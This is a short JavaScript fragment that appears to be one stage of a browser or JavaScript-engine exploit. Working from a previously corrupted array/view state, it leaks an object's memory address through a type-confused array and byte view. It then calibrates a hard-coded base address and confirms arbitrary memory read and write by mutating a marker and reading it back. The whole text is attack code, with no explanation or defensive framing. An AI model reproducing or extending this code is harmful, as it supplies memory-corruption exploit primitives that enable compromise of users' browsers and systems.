// Cache this page's independently measured base after rechecking a live anchor.
var state = window.__fw14ArrayState;
var result;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_anchor_preflight_failed");
  var base = 0x200ff0000;
  var bytes = [];
  try {
    state.array[0] = state.addressAnchor;
    for (var i = 0; i < 8; i++)
      bytes.push(state.view[state.index + i]);
  } finally {
    state.array[0] = state.a;
  }
  var hex = "0x";
  for (var j = 7; j >= 0; j--)
    hex += bytes[j].toString(16).padStart(2, "0");
  var index = Number(hex) + 8 - base;
  if (!Number.isSafeInteger(index) || index < 0 ||
      index + 3 >= 2097152 ||
      state.view[index] !== 0x44 || state.view[index + 1] !== 0x33 ||
      state.view[index + 2] !== 0x22 || state.view[index + 3] !== 0x11)
    throw new Error("measured_base_anchor_mismatch");
  var changed = false;
  try {
    state.addressAnchor.marker = 0x55667788;
    changed = state.view[index] === 0x88 &&
      state.view[index + 1] === 0x77 &&
      state.view[index + 2] === 0x66 &&
      state.view[index + 3] === 0x55;
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (!changed) throw new Error("anchor_live_mutation_mismatch");
  state.calibratedViewBase = base;
  result = { id: "base_cache_v1", status: "pass", details: {
    base: "0x" + base.toString(16), anchor_word: hex,
    anchor_index: index, mutation_matched: changed,
    array_restored: state.array[0] === state.a } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "base_cache_v1", status: "error",
    details: { error: String(error).slice(0, 200) } };
}
return [result];
